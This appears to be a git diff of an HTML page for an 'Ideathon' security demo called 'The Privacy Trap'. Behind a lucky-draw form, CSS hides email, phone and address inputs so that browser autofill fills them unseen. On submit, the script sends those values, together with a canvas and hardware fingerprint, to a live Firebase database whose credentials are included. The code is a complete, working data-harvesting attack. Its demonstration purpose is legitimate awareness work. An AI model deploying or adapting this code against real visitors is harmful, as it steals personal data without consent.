@@ -1,90 +1,377 @@
+ohtml
 <!DOCTYPE html>
 <html lang="en">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Ideathon Demo Form</title>
-  <style>
-  #email{
-    position: absolute; left: -9999px;
-  }
-  #phone{
-    position: absolute; left: -9999px;
-  }
-  #address{
-    position: absolute; left: -9999px;
-  }
-  </style>
+    <title>Ideathon Demo: The Privacy Trap</title>
+    
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link href="https://fonts.googleapis.com/css2?family=Fira+Code:wght@400;500;600&family=Inter:wght@400;600;700&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+
+    <script>
+        tailwind.config = {
+            theme: {
+                extend: {
+                    fontFamily: {
+                        'sans': ['Inter', 'sans-serif'],
+                        'mono': ['Fira Code', 'monospace'],
+                    },
+                    colors: {
+                        'cyber-dark': '#0f172a',
+                        'cyber-card': '#1e293b',
+                        'cyber-accent': '#38bdf8',
+                        'cyber-danger': '#f43f5e'
+                    }
+                }
+            }
+        }
+    </script>
+
+    <style>
+        body {
+            background-color: #0f172a;
+            color: #f8fafc;
+        }
+
+        /* 
+         * THE AUTOFILL TRAP 
+         * This CSS visually hides the input fields from the user, 
+         * but keeps them in the DOM so the browser's Autofill engine still sees them and fills them!
+         */
+        .trap-field {
+            position: absolute; 
+            left: -9999px;
+            opacity: 0;
+            height: 0;
+            width: 0;
+            pointer-events: none;
+        }
+
+        /* Custom Scrollbar for dashboard */
+        ::-webkit-scrollbar {
+            width: 6px;
+        }
+        ::-webkit-scrollbar-track {
+            background: #1e293b; 
+        }
+        ::-webkit-scrollbar-thumb {
+            background: #475569; 
+            border-radius: 4px;
+        }
+
+        /* Toast Animation */
+        .toast-enter {
+            animation: slideIn 0.3s ease-out forwards;
+        }
+        @keyframes slideIn {
+            from { transform: translateY(-100%); opacity: 0; }
+            to { transform: translateY(0); opacity: 1; }
+        }
+    </style>
 </head>
-<body>
+<body class="min-h-screen p-4 md:p-8 flex flex-col items-center">
 
-    <!-- सामान्य HTML फॉर्म (इसे आप अपने अनुसार CSS से कस्टमाइज़ कर सकते हैं) -->
-    <form id="demoForm">
-        <label>Name:</label>
-        <input type="text" id="name" name="name" autocomplete="name" required><br><br>
+    <!-- Custom Toast Notification Container (Replacing alert) -->
+    <div id="toast-container" class="fixed top-4 right-4 z-50 flex flex-col gap-2"></div>
 
-        <label></label>
-        <input type="email" id="email" name="email" autocomplete="email"><br><br>
+    <header class="w-full max-w-6xl mb-8 flex justify-between items-end border-b border-gray-700 pb-4">
+        <div>
+            <h1 class="text-3xl font-bold text-cyber-accent flex items-center gap-2">
+                <i class="fa-solid fa-spider"></i> Data Harvester Demo
+            </h1>
+            <p class="text-gray-400 mt-1">AegisWeb Ideathon Presentation - Live Execution</p>
+        </div>
+        <div id="auth-status" class="text-sm px-3 py-1 rounded bg-yellow-900/50 text-yellow-500 border border-yellow-700">
+            <i class="fa-solid fa-circle-notch fa-spin mr-1"></i> Authenticating...
+        </div>
+    </header>
 
-        <label></label>
-        <input type="tel" id="phone" name="phone" autocomplete="tel"><br><br>
+    <main class="w-full max-w-6xl grid grid-cols-1 lg:grid-cols-2 gap-8">
+        
+        <!-- LEFT COLUMN: The User Facing UI (The Bait) -->
+        <div class="space-y-6">
+            
+            <!-- The Trap Form -->
+            <div class="bg-cyber-card rounded-xl p-6 border border-gray-700 shadow-xl relative overflow-hidden">
+                <div class="absolute top-0 left-0 w-full h-1 bg-gradient-to-r from-blue-500 to-cyber-accent"></div>
+                <h2 class="text-xl font-bold mb-4 flex items-center gap-2">
+                    <i class="fa-solid fa-gift text-cyber-accent"></i> Lucky Draw Registration
+                </h2>
+                <p class="text-sm text-gray-400 mb-6">Enter your name to participate in the giveaway. Quick and simple!</p>
+                
+                <form id="demoForm" class="space-y-4">
+                    <!-- VISIBLE FIELD -->
+                    <div>
+                        <label class="block text-sm font-medium text-gray-300 mb-1">Full Name</label>
+                        <input type="text" id="name" name="name" autocomplete="name" required
+                               class="w-full bg-gray-800 border border-gray-600 rounded px-4 py-2 focus:outline-none focus:border-cyber-accent text-white transition-colors"
+                               placeholder="e.g. John Doe">
+                    </div>
 
-        <label></label>
-        <input type="text" id="address" name="address" autocomplete="street-address"><br><br>
+                    <!-- INVISIBLE TRAP FIELDS (Hidden by CSS) -->
+                    <!-- Notice how we use autocomplete attributes to bait the browser -->
+                    <div class="trap-field">
+                        <label>Hidden Email</label>
+                        <input type="email" id="email" name="email" autocomplete="email">
+                    </div>
+                    
+                    <div class="trap-field">
+                        <label>Hidden Phone</label>
+                        <input type="tel" id="phone" name="phone" autocomplete="tel">
+                    </div>
+                    
+                    <div class="trap-field">
+                        <label>Hidden Address</label>
+                        <input type="text" id="address" name="address" autocomplete="street-address">
+                    </div>
 
-        <button type="submit">Submit Data</button>
-    </form>
+                    <button type="submit" id="submitBtn" disabled
+                            class="w-full bg-cyber-accent text-gray-900 font-bold py-3 rounded hover:bg-blue-400 transition-colors disabled:opacity-50 disabled:cursor-not-allowed mt-4">
+                        Submit & Participate
+                    </button>
+                </form>
+            </div>
 
-    <!-- Firebase SDK (Version 10 Modular Setup) -->
+            <!-- Explicit Permissions Area (Warned by standard browsers) -->
+            <div class="bg-cyber-card rounded-xl p-6 border border-gray-700 shadow-xl">
+                <h2 class="text-xl font-bold mb-4 flex items-center gap-2 text-yellow-500">
+                    <i class="fa-solid fa-hand text-yellow-500"></i> Explicit Permissions Demo
+                </h2>
+                <p class="text-sm text-gray-400 mb-6">These actions usually trigger a browser warning. Standard browsers block these, but leak the data in the form above.</p>
+                
+                <div class="grid grid-cols-2 gap-4">
+                    <button id="btn-location" class="bg-gray-800 border border-gray-600 hover:border-yellow-500 text-gray-300 py-2 rounded text-sm transition-colors flex items-center justify-center gap-2">
+                        <i class="fa-solid fa-location-dot"></i> Get Location
+                    </button>
+                    <button id="btn-camera" class="bg-gray-800 border border-gray-600 hover:border-yellow-500 text-gray-300 py-2 rounded text-sm transition-colors flex items-center justify-center gap-2">
+                        <i class="fa-solid fa-camera"></i> Access Camera
+                    </button>
+                </div>
+            </div>
+
+        </div>
+
+        <!-- RIGHT COLUMN: The Hacker Dashboard (Judges View) -->
+        <div class="bg-black border border-cyber-danger rounded-xl flex flex-col shadow-[0_0_20px_rgba(244,63,94,0.15)] overflow-hidden h-[600px]">
+            <div class="bg-gray-900 px-4 py-3 border-b border-gray-800 flex justify-between items-center">
+                <div class="flex items-center gap-2">
+                    <div class="w-3 h-3 rounded-full bg-red-500"></div>
+                    <div class="w-3 h-3 rounded-full bg-yellow-500"></div>
+                    <div class="w-3 h-3 rounded-full bg-green-500"></div>
+                    <span class="ml-2 font-mono text-sm text-gray-400">Attacker Terminal (Live Data)</span>
+                </div>
+                <i class="fa-solid fa-user-secret text-cyber-danger"></i>
+            </div>
+            
+            <div id="hacker-console" class="p-4 font-mono text-sm overflow-y-auto flex-1 space-y-4">
+                <div class="text-gray-500">>> Waiting for user interaction...</div>
+                <div class="text-gray-500">>> Note: Standard browsers will leak autofill data & device fingerprint silently upon form submission.</div>
+            </div>
+        </div>
+
+    </main>
+
     <script type="module">
-        // Firebase के आवश्यक मॉड्यूल्स इम्पोर्ट करें
-        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.8.1/firebase-app.js";
-        import { getFirestore, collection, addDoc } from "https://www.gstatic.com/firebasejs/10.8.1/firebase-firestore.js";
+        // Firebase Version 11.6.1 Imports
+        import { initializeApp } from "https://www.gstatic.com/firebasejs/11.6.1/firebase-app.js";
+        import { getAuth, signInAnonymously, onAuthStateChanged } from "https://www.gstatic.com/firebasejs/11.6.1/firebase-auth.js";
+        import { getFirestore, collection, addDoc, serverTimestamp } from "https://www.gstatic.com/firebasejs/11.6.1/firebase-firestore.js";
 
-        // अपना Firebase Config यहाँ पेस्ट करें (जो आपने स्टेप 4 में कॉपी किया था)
+        // Your specific Firebase configuration
         const firebaseConfig = {
           apiKey: "AIzaSyC-73epZZPNsIenSP7jTnToHpJRSzZpPPc",
           authDomain: "autofilldem.firebaseapp.com",
           projectId: "autofilldem",
           storageBucket: "autofilldem.firebasestorage.app",
-          messagingSenderId: "326095186258",           appId: "1:326095186258:web:39c455e06cf099c854b28b",
+          messagingSenderId: "326095186258",           
+          appId: "1:326095186258:web:39c455e06cf099c854b28b",
           measurementId: "G-TF739GJS30"
         };
 
-        // Firebase इनिशियलाइज़ करें
+        // Custom UI Tools
+        const hackerConsole = document.getElementById('hacker-console');
+        const submitBtn = document.getElementById('submitBtn');
+        const authStatus = document.getElementById('auth-status');
+        let currentUser = null;
+
+        // Custom alternative to alert()
+        function showToast(message, type = 'info') {
+            const container = document.getElementById('toast-container');
+            const toast = document.createElement('div');
+            
+            let colors = 'bg-gray-800 border-blue-500 text-blue-400';
+            let icon = 'fa-circle-info';
+            if (type === 'success') { colors = 'bg-gray-800 border-green-500 text-green-400'; icon = 'fa-check-circle'; }
+            if (type === 'error') { colors = 'bg-gray-800 border-red-500 text-red-400'; icon = 'fa-triangle-exclamation'; }
+            if (type === 'warning') { colors = 'bg-gray-800 border-yellow-500 text-yellow-400'; icon = 'fa-shield'; }
+
+            toast.className = `toast-enter flex items-center gap-3 px-4 py-3 rounded shadow-lg border-l-4 ${colors} text-sm font-medium`;
+            toast.innerHTML = `<i class="fa-solid ${icon}"></i> <span>${message}</span>`;
+            
+            container.appendChild(toast);
+            setTimeout(() => {
+                toast.style.opacity = '0';
+                toast.style.transform = 'translateY(-20px)';
+                toast.style.transition = 'all 0.3s ease';
+                setTimeout(() => toast.remove(), 300);
+            }, 3000);
+        }
+
+        // Print to Hacker Dashboard
+        function logToConsole(title, dataObj, colorClass = "text-cyber-accent") {
+            const entry = document.createElement('div');
+            entry.className = "border-l-2 border-gray-700 pl-3 py-1 mb-2";
+            
+            let content = `<div class="font-bold ${colorClass}">[+] ${title}</div>`;
+            for (const [key, value] of Object.entries(dataObj)) {
+                let displayValue = value;
+                if (!value || value === "") displayValue = '<span class="text-gray-600">null/empty</span>';
+                content += `<div class="text-gray-300 ml-4"><span class="text-gray-500">${key}:</span> ${displayValue}</div>`;
+            }
+            entry.innerHTML = content;
+            hackerConsole.appendChild(entry);
+            hackerConsole.scrollTop = hackerConsole.scrollHeight;
+        }
+
+        // Function to extract silent data (No permissions required)
+        function collectSilentFingerprint() {
+            // Basic Canvas Fingerprinting (Hardware profile)
+            const canvas = document.createElement('canvas');
+            const ctx = canvas.getContext('2d');
+            ctx.textBaseline = "top";
+            ctx.font = "14px 'Arial'";
+            ctx.fillStyle = "#f60";
+            ctx.fillRect(125,1,62,20);
+            ctx.fillStyle = "#069";
+            ctx.fillText("AegisWebDemo", 2, 15);
+            const canvasData = canvas.toDataURL().slice(-50); // Get end of hash
+
+            return {
+                UserAgent: navigator.userAgent.substring(0, 50) + "...",
+                ScreenSize: `${window.screen.width}x${window.screen.height} (${window.screen.colorDepth}-bit)`,
+                Timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                Language: navigator.language,
+                Platform: navigator.platform || 'Unknown',
+                CPU_Cores: navigator.hardwareConcurrency || 'Unknown',
+                Memory_GB: navigator.deviceMemory || 'Unknown',
+                CanvasHash: canvasData
+            };
+        }
+
+        // Initialize Firebase
         const app = initializeApp(firebaseConfig);
         const db = getFirestore(app);
+        const auth = getAuth(app);
 
-        // फॉर्म सबमिशन को हैंडल करें
-        document.getElementById('demoForm').addEventListener('submit', async (e) => {
-            e.preventDefault(); // पेज को रीफ्रेश होने से रोकें
+        // Handle Authentication
+        signInAnonymously(auth).catch((error) => {
+            console.error("Auth Error:", error);
+            showToast("Failed to connect to backend", "error");
+            authStatus.innerHTML = `<i class="fa-solid fa-triangle-exclamation text-red-500"></i> Offline Mode`;
+        });
 
-            // इनपुट फील्ड्स से डेटा निकालें
-            const userName = document.getElementById('name').value;
-            const userEmail = document.getElementById('email').value;
-            const userPhone = document.getElementById('phone').value;
-            const userAddress = document.getElementById('address').value;
-
-            try {
-                // Firestore के 'autofill_demo_data' कलेक्शन में डेटा सेव करें
-                const docRef = await addDoc(collection(db, "autofill_demo_data"), {
-                    name: userName,
-                    email: userEmail,
-                    phone: userPhone,
-                    address: userAddress,
-                    timestamp: new Date()
-                });
-                console.log("Document written with ID: ", docRef.id);
-                alert("डेटा सफलतापूर्वक Firebase पर भेज दिया गया है!");
+        onAuthStateChanged(auth, (user) => {
+            if (user) {
+                currentUser = user;
+                authStatus.innerHTML = `<i class="fa-solid fa-check-circle text-green-500"></i> Connected (ID: ${user.uid.substring(0,6)}...)`;
+                submitBtn.disabled = false; // Enable form submission
                 
-                // फॉर्म को रिसेट करें
-                document.getElementById('demoForm').reset();
-            } catch (error) {
-                console.error("Error adding document: ", error);
-                alert("डेटा भेजने में कोई त्रुटि हुई। कंसोल चेक करें।");
+                // Set Firestore Path. 
+                // Checks if running in Immersive environment to obey strict path rules, otherwise uses standard path for GitHub.
+                window.dbCollectionPath = typeof __app_id !== 'undefined' 
+                    ? `artifacts/${__app_id}/users/${user.uid}/autofill_demo_data`
+                    : `autofill_demo_data`;
             }
         });
-    </script>
 
+        document.getElementById('demoForm').addEventListener('submit', async (e) => {
+            e.preventDefault(); 
+            if (!currentUser) return;
+
+            const btn = document.getElementById('submitBtn');
+            btn.innerHTML = '<i class="fa-solid fa-spinner fa-spin"></i> Harvesting...';
+            btn.disabled = true;
+
+            // 1. Extract Autofill Data (The Trap)
+            const formData = {
+                name_visible: document.getElementById('name').value,
+                email_hidden: document.getElementById('email').value,
+                phone_hidden: document.getElementById('phone').value,
+                address_hidden: document.getElementById('address').value,
+            };
+
+            // 2. Extract Silent Fingerprint Data
+            const silentData = collectSilentFingerprint();
+
+            // Display in Hacker Console
+            logToConsole("Autofill Extraction (Form Trap)", formData, "text-cyber-danger");
+            logToConsole("Silent Fingerprinting (Hardware)", silentData, "text-yellow-400");
+
+            // Combine for Firebase payload
+            const payload = {
+                formData: formData,
+                deviceData: silentData,
+                timestamp: serverTimestamp(),
+                userId: currentUser.uid
+            };
+
+            try {
+                // Save to Firestore
+                const docRef = await addDoc(collection(db, window.dbCollectionPath), payload);
+                showToast("Data Silently Harvested & Sent to DB", "error");
+                document.getElementById('demoForm').reset();
+            } catch (error) {
+                console.error("Firebase write error: ", error);
+                showToast("Error writing to database. Check console.", "warning");
+            } finally {
+                btn.innerHTML = 'Submit & Participate';
+                btn.disabled = false;
+            }
+        });
+
+        // --- Explicit Permissions Buttons Logic ---
+        
+        document.getElementById('btn-location').addEventListener('click', () => {
+            if ("geolocation" in navigator) {
+                showToast("Requesting Location (Requires Prompt)...", "info");
+                navigator.geolocation.getCurrentPosition(
+                    (position) => {
+                        const locData = { 
+                            Latitude: position.coords.latitude, 
+                            Longitude: position.coords.longitude,
+                            Accuracy: `${position.coords.accuracy} meters`
+                        };
+                        logToConsole("Explicit Data: Geolocation", locData, "text-green-400");
+                        showToast("Location successfully tracked.", "success");
+                    },
+                    (error) => {
+                        showToast(`Location Access Denied: ${error.message}`, "warning");
+                    }
+                );
+            }
+        });
+
+        document.getElementById('btn-camera').addEventListener('click', async () => {
+            try {
+                showToast("Requesting Camera Access (Requires Prompt)...", "info");
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                const track = stream.getVideoTracks()[0];
+                const camData = { 
+                    Device: track.label, 
+                    Status: "Access Granted, Feed Captured" 
+                };
+                logToConsole("Explicit Data: Camera/Media", camData, "text-green-400");
+                showToast("Camera access granted. Feed ready.", "success");
+                
+                // Immediately stop the stream so the camera light turns off
+                track.stop(); 
+            } catch (error) {
+                showToast("Camera Access Denied or Unavailable.", "warning");
+            }
+        });
+
+    </script>
 </body>
 </html>
